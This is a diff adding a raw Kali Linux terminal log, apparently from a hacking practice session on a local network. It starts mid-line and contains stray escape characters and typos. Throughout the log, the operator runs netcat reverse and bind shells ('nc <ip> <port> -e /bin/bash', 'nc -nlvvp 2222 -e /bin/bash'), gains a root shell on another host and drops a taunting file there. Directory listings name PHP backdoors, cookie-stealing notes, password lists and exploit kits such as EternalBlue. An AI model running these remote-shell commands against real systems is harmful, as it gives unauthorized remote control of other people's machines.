@@ -1,0 +1,108 @@
+". QUITTING.
+root@kali:~/Desktop# nc 192.168.0.161 ^[[2~^[[H -e /bin/bash
+root@kali:~/Desktop# mber "[2~
+root@kali:~/Desktop# 
+root@kali:~/Desktop# 
+root@kali:~/Desktop# clear
+^Z   
+[1]+  Stopped                 nc 192.168.0.161 5000
+root@kali:~# nc 192.168.0.161 21
+fsd
+hi'
+^Z
+[2]+  Stopped                 nc 192.168.0.161 21
+root@kali:~# nc 192.168.0.161 80
+dasd
+hi
+git^Z
+[3]+  Stopped                 nc 192.168.0.161 80
+root@kali:~# git status
+fatal: not a git repository (or any of the parent directories): .git
+root@kali:~# ls
+1                    abc         day13.txt                            full.nmap      Kavya                    profiles.csv  sysinfo
+111                  ApoorvA     Deepthi                              full.xml       LinEnum                  Public        Templates
+192.168.0.114        arun        DEs                                  FxNEwxeq.jpeg  linux-exploit-suggester  puneeth       test.elf
+192.168.0.149.gnmap  Arun        Desktop                              getprivs       MaMQKvbu.jpeg            shellphish    test.txt
+192.168.0.149.nmap   background  Documents                            getsystem      medium.txt               slowloris.pl  use
+192.168.0.149.xml    bhavyatha   Downloads                            getuid         mobile.txt               small.gnmap   Videos
+23456                Bhavyatha   Eternalblue-Doublepulsar-Metasploit  got.txt        Music                    small.nmap    wecLJVfs.jpeg
+2_atk6-dnsdict.txt   blackeye    fimap.log                            hello.txt      nikkitha                 small.xml     Yogesh
+2_dnsenum.txt        Breacher    fimap_result.xml                     iNyNgPsO.jpeg  nmap-vulners             sslstrip.log
+2_dns_lookup.txt     csrf.html   full.gnmap                           jiPwAcmf.jpeg  Pictures                 stash.sqlite
+root@kali:~# cd Desktop/
+root@kali:~/Desktop# ls
+ abida.txt       'cookie stealing.txt'   jp.exe    logo.php                passwords.txt         sqlmap.txt         'union based sqli on dvwa.txt'   xxe.txt
+ alive.txt        cooki-stealing.txt     jp.msi    naveentest.txt          Rav_phpbackdoor.php   sslstrip.log        usernames.txt
+ Amit             csrf.html              jp.txt    nikki_phpbackdoor.php   sid_phpbackdoor.php   tor-browser_en-US   wifi.txt
+ angry_scan.txt   hydra.txt              kk.html   passwd.txt              so                    uname.txt           xtremeWordList.txt
+root@kali:~/Desktop# nc 192
+Ncat: You must specify a host to connect to. QUITTING.
+root@kali:~/Desktop# nc 192.168.0.161 -e /bib/bash
+Ncat: Connection refused.
+root@kali:~/Desktop# nc 192.168.0.161 ^[[2~^[[H -e /bin/bash
+Ncat: Invalid port number "[2~
+root@kali:~/Desktop# nc 192.168.0.181 -e /bin/bash
+Ncat: Connection refused.
+root@kali:~/Desktop# nc 192.168.0.181 6513 -e /bin/bash
+ls  
+cd Desktop
+pwd
+
+ls
+root@kali:~/Desktop# ls
+ abida.txt       'cookie stealing.txt'   jp.exe    logo.php                passwords.txt         sqlmap.txt         'union based sqli on dvwa.txt'   xxe.txt
+ alive.txt        cooki-stealing.txt     jp.msi    naveentest.txt          Rav_phpbackdoor.php   sslstrip.log        usernames.txt
+ Amit             csrf.html              jp.txt    nikki_phpbackdoor.php   sid_phpbackdoor.php   tor-browser_en-US   wifi.txt
+ angry_scan.txt   hydra.txt              kk.html   passwd.txt              so                    uname.txt           xtremeWordList.txt
+root@kali:~/Desktop# cd Desktop
+bash: cd: Desktop: No such file or directory
+root@kali:~/Desktop# pwd
+/root/Desktop
+root@kali:~/Desktop# 
+root@kali:~/Desktop# ls
+ abida.txt       'cookie stealing.txt'   jp.exe    logo.php                passwords.txt         sqlmap.txt         'union based sqli on dvwa.txt'   xxe.txt
+ alive.txt        cooki-stealing.txt     jp.msi    naveentest.txt          Rav_phpbackdoor.php   sslstrip.log        usernames.txt
+ Amit             csrf.html              jp.txt    nikki_phpbackdoor.php   sid_phpbackdoor.php   tor-browser_en-US   wifi.txt
+ angry_scan.txt   hydra.txt              kk.html   passwd.txt              so                    uname.txt           xtremeWordList.txt
+root@kali:~/Desktop# nc 192.168.0.181 6513 -e /bin/bash
+pwd
+^Z
+[4]+  Stopped                 nc 192.168.0.181 6513 -e /bin/bash
+root@kali:~/Desktop# nc 192.168.0.181 6513 -e /bin/bash
+Ncat: Connection refused.
+root@kali:~/Desktop# nc 192.168.0.181 6513 -e /bin/bash
+Ncat: Connection refused.
+root@kali:~/Desktop# nc 192.168.0.161 1111 -e /bin/bash
+pwd
+id
+^C
+root@kali:~/Desktop# nc 192.168.0.161 1111 -e /bin/bash
+id
+^C
+root@kali:~/Desktop# nc 192.168.0.161 1111
+Ncat: Connection refused.
+root@kali:~/Desktop# nc 192.168.0.161 1111
+whoami
+root
+pwd
+/root
+cd Desktop                  
+ls
+alive.fping.txt
+pwd
+/root/Desktop
+echo 
+
+
+echo "You are never hacked" > temp.txt 
+delete ^Z  
+[5]+  Stopped                 nc 192.168.0.161 1111
+root@kali:~/Desktop# nc -nlvvp 2222 -e /bin/bash
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::2222
+Ncat: Listening on 0.0.0.0:2222
+Ncat: Connection from 192.168.0.161.
+Ncat: Connection from 192.168.0.161:47276.
+NCAT DEBUG: Executing: /bin/bash
+/bin/bash: line 1: pws: command not found
+
